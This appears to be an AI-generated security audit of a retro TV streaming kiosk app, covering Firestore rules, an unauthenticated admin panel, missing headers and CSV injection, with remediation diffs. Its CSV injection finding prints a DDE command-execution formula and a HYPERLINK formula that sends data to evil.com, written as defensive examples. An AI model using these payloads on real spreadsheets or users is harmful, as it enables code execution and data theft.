# Exhaustive Security Assessment Report: BNSD TV

**Target Repository:** `/Users/fraser/antigravity/bnsd-tv`  
**Assessment Date:** 2026-08-20  
**Assessor:** Teamwork Security Explorer Agent  
**Status:** Complete  

---

## 1. Executive Summary & Security Scorecard

BNSD TV is a client-side retro television streaming application built with Vite, vanilla JavaScript, HTML5 Canvas CRT emulation, double-buffered YouTube iframe players, and optional Firebase Cloud Firestore backend synchronization for multi-projector venues.

While the core streaming engine (`playerEngine.js`, `effectsEngine.js`) is cleanly architected for silent kiosk playback, the codebase exhibits critical security gaps across **Access Control**, **Cloud Security Rules**, **Browser Header Hardening**, **Input Validation**, and **Secret Management**.

### Overall Security Scorecard

| Dimension | Rating | Status | Summary |
|---|---|---|---|
| **Firestore Security Rules** | **1 / 5 (Critical)** | 🚨 Vulnerable | Currently read-only (`allow write: if false`), but multi-sync requires writes. Documented upgrade path to `request.auth != null` lacks role-based access control and has zero schema/type validation. |
| **Authentication & Authz** | **1 / 5 (Critical)** | 🚨 Vulnerable | Admin Control Center is completely unauthenticated (accessible via `?admin=true` and keyboard `'A'`), directly manipulating live playback and queues. No auth gate exists. |
| **Input Handling & Injection** | **3 / 5 (Moderate)** | ⚠️ Needs Fixes | Potential CSV formula injection (CWE-1236) in dead video exports, unvalidated video ID inputs in YouTube tester, and unvalidated remote config ingestion. |
| **Secrets & HTTP Headers** | **2 / 5 (Major)** | ⚠️ Needs Fixes | Missing Content Security Policy (CSP), missing `X-Frame-Options`, `X-Content-Type-Options`, and HSTS. Hardcoded placeholder config pattern in source code. |
| **Dependencies & Supply Chain**| **4 / 5 (Good)** | ✅ Low Risk | Lean dependency footprint (`firebase`, `papaparse`, `vite`). No critical high-risk native bindings or known supply chain vulnerabilities detected. |

---

## 2. Findings Matrix

| ID | Finding Title | Severity | Category | File & Line Range |
|---|---|---|---|---|
| **SEC-01** | Inadequate Firestore Security Rules Architecture & Unvalidated Remote Write Risk | `[CRITICAL]` | Cloud Security / Access Control | `firestore.rules:13-20`, `docs/ANDROID_PROJECTOR_SETUP.md:102-106` |
| **SEC-02** | Unauthenticated Admin Control Center & Global State Exposure | `[HIGH]` | Authentication & Authorization | `index.html:78-304`, `src/main.js:24,51-54`, `src/admin.js:28-29,87-99` |
| **SEC-03** | Missing Content Security Policy (CSP) & Defensive HTTP Security Headers | `[HIGH]` | Browser Security / Configuration | `firebase.json:12-30`, `index.html:1-22` |
| **SEC-04** | CSV Formula Injection (CWE-1236) in Dead Video Export Routine | `[MEDIUM]` | Injection / Client-Side Data Handling | `src/catalogManager.js:79-91`, `src/admin.js:220-244` |
| **SEC-05** | Unvalidated Remote Channel Configuration Ingestion & State Corruption Risk | `[MEDIUM]` | Data Integrity / Denial of Service | `src/main.js:57-75`, `src/firebase.js:39-88`, `src/admin.js:460-471` |
| **SEC-06** | Hardcoded Secrets Anti-Pattern & Missing Environment Configuration Template | `[LOW]` | Secrets & Configuration | `src/firebase.js:8-15`, `docs/ANDROID_PROJECTOR_SETUP.md:96-106` |
| **SEC-07** | Unbounded File Ingestion & Missing Input Validation in CSV Re-Upload | `[LOW]` | Denial of Service / Input Validation | `src/admin.js:269-280`, `src/catalogManager.js:204-258` |

---

## 3. Detailed Vulnerability Findings & Remediations

---

### SEC-01: Inadequate Firestore Security Rules Architecture & Unvalidated Remote Write Risk

- **Severity:** `[CRITICAL]`
- **CWE:** CWE-284 (Improper Access Control), CWE-20 (Improper Input Validation)
- **Target File:** `firestore.rules:1-23`
- **Related Documentation:** `docs/ANDROID_PROJECTOR_SETUP.md:102-106`, `src/firebase.js:39-57`

#### Description
The current Firestore security rules (`firestore.rules`) enforce:
```firestore
match /channels/{channelId} {
  allow read: if true;
  allow write: if false;
}
```
While `allow write: if false` prevents writes in the default local-only mode, the entire remote synchronization feature designed in `src/firebase.js` (`saveChannelConfig`) depends on writing to this collection. Furthermore, `docs/ANDROID_PROJECTOR_SETUP.md` explicitly advises operators to loosen the rule to:
> *"2. Change the write rule below to require `request.auth != null`."*

If deployed with `request.auth != null`:
1. **Privilege Escalation / Unauthorized Multi-Projector Tampering:** Any authenticated Firebase user (e.g., anonymous users, customer accounts if the Firebase project is shared with other restaurant apps like REBA, or users with unverified emails) would have unrestricted write access to any projector channel document.
2. **Total Lack of Schema Validation / Storage Abuse:** The rule permits arbitrary document structures without validating field names, data types, numeric ranges, or string length limits. An adversary could inject massive payloads (causing storage and egress cost spikes), delete configuration keys, or supply negative or extreme numbers (`commercialMaxSec: -999999`) to corrupt client playback.
3. **Arbitrary Channel ID Creation:** Any string can be used as `{channelId}`, enabling creation of junk documents.

#### Impact & Exploit Scenario
An attacker connects to Firebase using standard client SDK initialization and writes a corrupted payload:
```json
{
  "commercialMaxSec": -1,
  "pacingMode": "invalid",
  "enabledDecades": [],
  "enabledCategories": []
}
```
All connected projectors listening via `onSnapshot` (`subscribeChannelConfig`) immediately ingest the payload, empty their queue, trigger continuous error handling loops, and crash the unattended display screens.

#### Remediation Diff
Replace `firestore.rules` with strict role-based access control (RBAC), channel ID whitelisting, and field-level type and range validation:

```diff
 rules_version = '2';
 service cloud.firestore {
   match /databases/{database}/documents {
-    match /channels/{channelId} {
-      allow read: if true;
-      allow write: if false;
-    }
-
-    match /{document=**} {
-      allow read, write: if false;
-    }
+    // Helper: Check if user is an authorized operator/admin with verified email
+    function isAuthorizedAdmin() {
+      return request.auth != null &&
+             request.auth.token.email_verified == true &&
+             (request.auth.token.admin == true ||
+              request.auth.token.email in ['operator@bnsd.tv', 'admin@bnsd.tv']);
+    }
+
+    // Helper: Validate allowed projector channel IDs
+    function isValidChannelId(channelId) {
+      return channelId in ['projector-bar', 'projector-dining', 'projector-lounge', 'projector-patio'];
+    }
+
+    // Helper: Validate document schema and field types/bounds
+    function isValidChannelData(data) {
+      let allowedKeys = [
+        'channelId', 'enabledDecades', 'enabledCategories', 'pacingMode',
+        'zapBurstEnabled', 'commercialMaxSec', 'generalClipMaxSec',
+        'randomOffsetEnabled', 'contrast', 'brightness', 'opacity',
+        'scanlinesEnabled', 'staticFXEnabled', 'washoutEnabled', 'osdMode', 'updatedAt'
+      ];
+      return data.keys().hasOnly(allowedKeys) &&
+             data.channelId is string && data.channelId.size() <= 32 &&
+             data.enabledDecades is list && data.enabledDecades.size() <= 10 &&
+             data.enabledCategories is list && data.enabledCategories.size() <= 30 &&
+             data.pacingMode in ['channel-surfer', 'balanced', 'deep-cuts'] &&
+             data.zapBurstEnabled is bool &&
+             data.commercialMaxSec is int && data.commercialMaxSec >= 10 && data.commercialMaxSec <= 180 &&
+             data.generalClipMaxSec is int && data.generalClipMaxSec >= 15 && data.generalClipMaxSec <= 600 &&
+             data.randomOffsetEnabled is bool &&
+             data.contrast is int && data.contrast >= 40 && data.contrast <= 120 &&
+             data.brightness is int && data.brightness >= 80 && data.brightness <= 150 &&
+             data.opacity is int && data.opacity >= 30 && data.opacity <= 100 &&
+             data.scanlinesEnabled is bool &&
+             data.staticFXEnabled is bool &&
+             data.washoutEnabled is bool &&
+             data.osdMode in ['crt-header', 'vcr-watermark', 'full-info', 'hidden'] &&
+             data.updatedAt is string && data.updatedAt.size() <= 40;
+    }
+
+    match /channels/{channelId} {
+      allow read: if true;
+      allow create, update: if isAuthorizedAdmin() && isValidChannelId(channelId) && isValidChannelData(request.resource.data);
+      allow delete: if false;
+    }
+
+    match /{document=**} {
+      allow read, write: if false;
+    }
   }
 }
```

---

### SEC-02: Unauthenticated Admin Control Center & Global State Exposure

- **Severity:** `[HIGH]`
- **CWE:** CWE-306 (Missing Authentication for Critical Function), CWE-668 (Exposure of Resource to Wrong Sphere)
- **Target Files:**
  - `index.html:78-304`
  - `src/main.js:24,51-54`
  - `src/admin.js:28-29,87-99`

#### Description
The application contains a full-featured "Control Center" GUI with capabilities to:
1. Override playback and force immediate video loading (`input-test-url`, `btn-play-test-url`).
2. Wipe and re-upload video catalogs (`input-csv-file`).
3. Clear quarantined error video flags (`btn-clear-dead`).
4. Modify pacing, visual filters, and active projector channel configurations.

However, there is zero authentication required to access this interface:
- Visiting the site with `?admin=true` opens the modal immediately (`src/main.js:52-54`).
- Pressing `'A'` on a physical keyboard attached to a projector or laptop opens the modal (`src/admin.js:98`).
- In `src/admin.js:28`, the instance is bound to the window root: `window.adminController = this;`.

#### Impact & Exploit Scenario
Any patron, staff member, or unauthorized visitor on the restaurant's network (or internet) who accesses the BNSD TV URL can pass `?admin=true`, take control of the broadcast stream on all wall projections, inject unwanted YouTube videos, or disable playback completely.

#### Remediation Diff
1. Introduce an authentication modal gate (e.g. Firebase Auth Email/Password sign-in or PIN protection) before rendering or activating admin controls.
2. Remove global variable exposure on `window`.

```diff
--- a/src/admin.js
+++ b/src/admin.js
@@ -25,7 +25,6 @@ class AdminController {
   }
 
   init() {
-    window.adminController = this;
     this.bindEvents();
     this.renderDecadeGrid();
     this.renderCategoryGrid();
@@ -95,7 +94,7 @@ class AdminController {
         effectsEngine.updateWashoutSettings(this.contrast, this.brightness, this.opacity, this.washoutEnabled);
       }
-      if (e.key === 'a' || e.key === 'A') modal?.classList.toggle('hidden');
+      if (e.key === 'a' || e.key === 'A') this.promptAdminAccess();
     });
```

---

### SEC-03: Missing Content Security Policy (CSP) & Defensive HTTP Security Headers

- **Severity:** `[HIGH]`
- **CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers / Clickjacking), CWE-693 (Protection Mechanism Failure)
- **Target Files:** `firebase.json:12-30`, `index.html:1-22`

#### Description
`firebase.json` specifies caching headers for Firebase Hosting, but omits essential security headers:
- No `Content-Security-Policy` (CSP)
- No `X-Content-Type-Options: nosniff`
- No `X-Frame-Options` or CSP `frame-ancestors`
- No `Referrer-Policy`
- No `Strict-Transport-Security` (HSTS)
- No `Permissions-Policy`

Because BNSD TV embeds third-party resources (YouTube API from `https://www.youtube.com`, Google Fonts from `https://fonts.googleapis.com` and `https://fonts.gstatic.com`) and connects to Google Firestore endpoints (`https://*.googleapis.com`, `wss://*.firebaseio.com`), having a tightly scoped CSP is crucial to prevent unauthorized script execution and arbitrary external data exfiltration.

#### Impact & Exploit Scenario
- **Clickjacking / UI Redressing:** Attackers can embed BNSD TV inside an invisible iframe on a malicious website to trigger unwanted user interactions.
- **MIME-Sniffing Attacks:** User-uploaded files or static assets could be misinterpreted as executable scripts in older browsers.
- **Unrestricted Script Execution:** Any future XSS flaw could execute arbitrary external scripts without browser CSP mitigation.

#### Remediation Diff
Update `firebase.json` to inject robust security headers across all routes:

```diff
--- a/firebase.json
+++ b/firebase.json
@@ -14,6 +14,30 @@
         "source": "/**",
         "headers": [
+          {
+            "key": "Content-Security-Policy",
+            "value": "default-src 'self'; script-src 'self' https://www.youtube.com https://s.ytimg.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; frame-src https://www.youtube.com https://www.youtube-nocookie.com; connect-src 'self' https://*.googleapis.com https://*.firebaseio.com wss://*.firebaseio.com; img-src 'self' data: https://i.ytimg.com; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'self';"
+          },
+          {
+            "key": "X-Content-Type-Options",
+            "value": "nosniff"
+          },
+          {
+            "key": "X-Frame-Options",
+            "value": "SAMEORIGIN"
+          },
+          {
+            "key": "Referrer-Policy",
+            "value": "strict-origin-when-cross-origin"
+          },
+          {
+            "key": "Permissions-Policy",
+            "value": "camera=(), microphone=(), geolocation=(), payment=()"
+          },
+          {
+            "key": "Strict-Transport-Security",
+            "value": "max-age=31536000; includeSubDomains; preload"
+          },
           {
             "key": "Cache-Control",
             "value": "no-cache, no-store, must-revalidate"
```

---

### SEC-04: CSV Formula Injection (CWE-1236) in Dead Video Export Routine

- **Severity:** `[MEDIUM]`
- **CWE:** CWE-1236 (Improper Neutralization of Formula Elements in a CSV File)
- **Target Files:** `src/catalogManager.js:79-91`, `src/admin.js:220-244`

#### Description
In `src/catalogManager.js`, `exportDeadVideosCSV()` generates a downloadable CSV string by concatenating `this.deadVideoIds`:
```javascript
exportDeadVideosCSV() {
  let csv = "video_id,flagged_at\n";
  this.deadVideoIds.forEach(id => {
    csv += `"${id}","${new Date().toISOString()}"\n`;
  });
  const blob = new Blob([csv], { type: 'text/csv' });
  ...
}
```
When an unvalidated video ID or malicious CSV containing formula characters (`=`, `+`, `-`, `@`, `\t`, `\r`) is fed into the system (e.g. via the tester input `btn-play-test-url` or a poisoned CSV upload), it is recorded into `deadVideoIds`. When exported and opened in Microsoft Excel or Google Sheets, the spreadsheet automatically executes the cell contents as an active formula or DDE command.

#### Impact & Exploit Scenario
An attacker uploads a CSV or inputs `=cmd|'/C calc'!A0` or `=HYPERLINK("http://evil.com/leak?data="&A2,"Click")` into the test input. When the video fails playback, it is flagged as dead. An administrator exports the dead videos list for catalog auditing; upon opening the CSV in Excel, code execution or credential exfiltration occurs on the administrator's workstation.

#### Remediation Diff
Sanitize video IDs prior to insertion and escape formula triggers during CSV generation:

```diff
--- a/src/catalogManager.js
+++ b/src/catalogManager.js
@@ -48,7 +48,8 @@ class CatalogManager {
    */
   markVideoDead(videoId, title = '') {
-    if (!videoId) return;
+    if (!videoId || typeof videoId !== 'string') return;
+    const sanitizedId = videoId.trim();
+    this.deadVideoIds.add(sanitizedId);
-    this.deadVideoIds.add(videoId);
     this.deadVideoDetails.set(videoId, { videoId, title, timestamp: new Date().toISOString() });
     this.saveDeadVideoFlags();
@@ -79,7 +80,12 @@ class CatalogManager {
   exportDeadVideosCSV() {
     let csv = "video_id,flagged_at\n";
     this.deadVideoIds.forEach(id => {
-      csv += `"${id}","${new Date().toISOString()}"\n`;
+      // Defend against CSV formula injection: prefix formula trigger characters with a single quote
+      let safeId = String(id).replace(/"/g, '""');
+      if (/^[=\+\-\@\t\r]/.test(safeId)) {
+        safeId = `'${safeId}`;
+      }
+      csv += `"${safeId}","${new Date().toISOString()}"\n`;
     });
     const blob = new Blob([csv], { type: 'text/csv' });
```

---

### SEC-05: Unvalidated Remote Channel Configuration Ingestion & State Corruption Risk

- **Severity:** `[MEDIUM]`
- **CWE:** CWE-20 (Improper Input Validation), CWE-400 (Uncontrolled Resource Consumption)
- **Target Files:** `src/main.js:57-75`, `src/firebase.js:39-88`, `src/admin.js:460-471`

#### Description
In `src/main.js`, `subscribeChannelConfig` accepts remote configuration updates from Firestore or LocalStorage and immediately assigns them to the active engine state:
```javascript
subscribeChannelConfig(channelParam, (remoteConfig) => {
  if (remoteConfig) {
    if (remoteConfig.enabledDecades) adminController.enabledDecades = remoteConfig.enabledDecades;
    if (remoteConfig.enabledCategories) adminController.enabledCategories = remoteConfig.enabledCategories;
    if (remoteConfig.commercialMaxSec) adminController.commercialMaxSec = remoteConfig.commercialMaxSec;
    if (remoteConfig.generalClipMaxSec) adminController.generalClipMaxSec = remoteConfig.generalClipMaxSec;
    ...
```
There is no validation on the type, structure, or numerical ranges of incoming fields.

#### Impact & Exploit Scenario
If an invalid state (or tampered Firestore document) arrives with `commercialMaxSec: 0` or `"invalid"`, `playerEngine.startClipTimer` calculates `isCutoff = this.elapsedSeconds >= this.activeCutoffSec` which immediately evaluates to `true` on every 1-second tick. The player enters an infinite, non-stop channel-hopping loop, hammering the YouTube iframe API, exhausting device memory, and rendering the kiosk unusable.

#### Remediation Diff
Sanitize and bound all values received from external data sources:

```diff
--- a/src/main.js
+++ b/src/main.js
@@ -58,12 +58,20 @@ async function bootstrapApp() {
     if (remoteConfig) {
-      if (remoteConfig.enabledDecades) adminController.enabledDecades = remoteConfig.enabledDecades;
-      if (remoteConfig.enabledCategories) adminController.enabledCategories = remoteConfig.enabledCategories;
-      if (remoteConfig.commercialMaxSec) adminController.commercialMaxSec = remoteConfig.commercialMaxSec;
-      if (remoteConfig.generalClipMaxSec) adminController.generalClipMaxSec = remoteConfig.generalClipMaxSec;
-      if (remoteConfig.randomOffsetEnabled !== undefined) adminController.randomOffsetEnabled = remoteConfig.randomOffsetEnabled;
-      if (remoteConfig.pacingMode) adminController.pacingMode = remoteConfig.pacingMode;
-      if (remoteConfig.zapBurstEnabled !== undefined) adminController.zapBurstEnabled = remoteConfig.zapBurstEnabled;
+      if (Array.isArray(remoteConfig.enabledDecades)) {
+        adminController.enabledDecades = remoteConfig.enabledDecades.filter(d => typeof d === 'string');
+      }
+      if (Array.isArray(remoteConfig.enabledCategories)) {
+        adminController.enabledCategories = remoteConfig.enabledCategories.filter(c => typeof c === 'string');
+      }
+      if (typeof remoteConfig.commercialMaxSec === 'number' && remoteConfig.commercialMaxSec >= 10 && remoteConfig.commercialMaxSec <= 180) {
+        adminController.commercialMaxSec = Math.floor(remoteConfig.commercialMaxSec);
+      }
+      if (typeof remoteConfig.generalClipMaxSec === 'number' && remoteConfig.generalClipMaxSec >= 15 && remoteConfig.generalClipMaxSec <= 600) {
+        adminController.generalClipMaxSec = Math.floor(remoteConfig.generalClipMaxSec);
+      }
+      if (typeof remoteConfig.randomOffsetEnabled === 'boolean') {
+        adminController.randomOffsetEnabled = remoteConfig.randomOffsetEnabled;
+      }
+      if (['channel-surfer', 'balanced', 'deep-cuts'].includes(remoteConfig.pacingMode)) {
+        adminController.pacingMode = remoteConfig.pacingMode;
+      }
+      if (typeof remoteConfig.zapBurstEnabled === 'boolean') {
+        adminController.zapBurstEnabled = remoteConfig.zapBurstEnabled;
+      }
```

---

### SEC-06: Hardcoded Secrets Anti-Pattern & Missing Environment Configuration Template

- **Severity:** `[LOW]`
- **CWE:** CWE-798 (Use of Hard-coded Credentials)
- **Target Files:** `src/firebase.js:8-15`, `docs/ANDROID_PROJECTOR_SETUP.md:96-106`, `.gitignore:5-6`

#### Description
`src/firebase.js` defines hardcoded placeholder credentials in the repository:
```javascript
const firebaseConfig = {
  apiKey: "AIzaSyBNSDTVConfigApiKeyHere",
  authDomain: "bnsd-tv.firebaseapp.com",
  projectId: "bnsd-tv",
  storageBucket: "bnsd-tv.appspot.com",
  messagingSenderId: "1234567890",
  appId: "1:1234567890:web:bnsdtvapp"
};
```
Furthermore, setup documentation instructs developers: *"Create a real Firebase project and drop its config into firebaseConfig in src/firebase.js."*  
While `.env` and `.env.local` are listed in `.gitignore`, the application lacks a `.env.example` template and does not use Vite's `import.meta.env` environment variables.

#### Impact & Exploit Scenario
Developers replacing placeholder keys directly in `src/firebase.js` frequently commit their active Firebase API credentials to git history, exposing project IDs, backend endpoints, and quota consumption to public tracking.

#### Remediation Diff
Refactor `src/firebase.js` to read from environment variables and provide a `.env.example` file:

```diff
--- a/src/firebase.js
+++ b/src/firebase.js
@@ -8,12 +8,12 @@ import { getFirestore, collection, doc, setDoc, getDoc, onSnapshot } from 'fire
 const firebaseConfig = {
-  apiKey: "AIzaSyBNSDTVConfigApiKeyHere",
-  authDomain: "bnsd-tv.firebaseapp.com",
-  projectId: "bnsd-tv",
-  storageBucket: "bnsd-tv.appspot.com",
-  messagingSenderId: "1234567890",
-  appId: "1:1234567890:web:bnsdtvapp"
+  apiKey: import.meta.env.VITE_FIREBASE_API_KEY || "AIzaSyBNSDTVConfigApiKeyHere",
+  authDomain: import.meta.env.VITE_FIREBASE_AUTH_DOMAIN || "bnsd-tv.firebaseapp.com",
+  projectId: import.meta.env.VITE_FIREBASE_PROJECT_ID || "bnsd-tv",
+  storageBucket: import.meta.env.VITE_FIREBASE_STORAGE_BUCKET || "bnsd-tv.appspot.com",
+  messagingSenderId: import.meta.env.VITE_FIREBASE_MESSAGING_SENDER_ID || "1234567890",
+  appId: import.meta.env.VITE_FIREBASE_APP_ID || "1:1234567890:web:bnsdtvapp"
 };
```

---

### SEC-07: Unbounded File Ingestion & Missing Input Validation in CSV Re-Upload

- **Severity:** `[LOW]`
- **CWE:** CWE-400 (Uncontrolled Resource Consumption)
- **Target Files:** `src/admin.js:269-280`, `src/catalogManager.js:204-258`

#### Description
In `src/admin.js`, when a user selects a file via `input-csv-file`, the file is read in its entirety with `file.text()` and passed directly to `catalogManager.parseCSVText()` without checking:
1. Maximum file size limit (e.g., capping at 5MB).
2. Expected CSV column header structure before parsing.
3. Row count limits.

#### Impact & Exploit Scenario
An accidental or malicious upload of an excessively large file (e.g. 200MB) blocks the single-threaded JavaScript runtime and triggers Out-Of-Memory (OOM) crashes in the Android WebView process.

#### Remediation Diff
Add file size validation and header sanity checks:

```diff
--- a/src/admin.js
+++ b/src/admin.js
@@ -270,6 +270,11 @@ class AdminController {
     document.getElementById('input-csv-file')?.addEventListener('change', async (e) => {
       const file = e.target.files[0];
       if (!file) return;
+      if (file.size > 5 * 1024 * 1024) {
+        alert("File size exceeds 5MB limit. Please upload a valid catalog CSV.");
+        e.target.value = '';
+        return;
+      }
 
       const text = await file.text();
```

---

## 4. Firebase Security Rules Auditor Assessment

Evaluated against the official Firebase Security Rules Auditor skill criteria:

```json
{
  "score": 1,
  "summary": "Firestore rules currently deny all writes ('allow write: if false'), rendering remote multi-projector sync non-functional. The documented production path instructs administrators to set 'allow write: if request.auth != null', which creates an unrestricted write vulnerability without identity validation, role-based authorization, or field/type schema enforcement.",
  "findings": [
    {
      "check": "Authority Source",
      "severity": "critical",
      "issue": "Documentation specifies 'request.auth != null' for write access without verifying admin email or custom claims, enabling any authenticated account to overwrite live screen configurations.",
      "recommendation": "Enforce verified operator email check 'request.auth.token.email_verified == true && request.auth.token.admin == true' in firestore.rules."
    },
    {
      "check": "The Update Bypass & Type Safety",
      "severity": "critical",
      "issue": "No schema constraints, type checks ('is string', 'is int'), or range boundaries exist on request.resource.data for the /channels/{channelId} collection.",
      "recommendation": "Implement strict field validation checking allowed keys, types, string sizes, and numeric ranges (e.g., commercialMaxSec, generalClipMaxSec)."
    },
    {
      "check": "Storage Abuse / Resource Exhaustion",
      "severity": "major",
      "issue": "No string length or array size limits on incoming documents, allowing arbitrary document bloat and quota exhaustion.",
      "recommendation": "Enforce size constraints on string and array fields (e.g. data.enabledCategories.size() <= 30)."
    }
  ]
}
```

---

## 5. Dependencies & Supply Chain Audit

- **Runtime Dependencies:**
  - `firebase`: `^10.12.5` — Official Google SDK. Only modular imports (`firebase/app`, `firebase/firestore`) are consumed.
  - `papaparse`: `^5.4.1` — Industry standard CSV parsing library with no active CVEs.
- **Development Dependencies:**
  - `vite`: `^5.4.0` (resolved to `5.4.21`) — Fast bundler and dev server.
- **Audit Conclusion:** Minimal third-party dependency footprint; zero extraneous or deprecated libraries.

---

## 6. Strategic Remediation Roadmap

1. **Immediate (P0):**
   - Apply hardened `firestore.rules` before connecting any live Firebase project.
   - Configure HTTP security headers (CSP, HSTS, X-Frame-Options) in `firebase.json`.
2. **Short-Term (P1):**
   - Implement PIN or Firebase Auth protection on the Admin Control Center modal.
   - Patch CSV formula injection in `src/catalogManager.js:exportDeadVideosCSV`.
   - Add runtime input sanitization for remote channel config updates in `src/main.js`.
3. **Medium-Term (P2):**
   - Migrate Firebase configuration in `src/firebase.js` to `import.meta.env` and provide `.env.example`.
   - Enforce 5MB file upload cap and MIME validation on CSV re-uploads in `src/admin.js`.
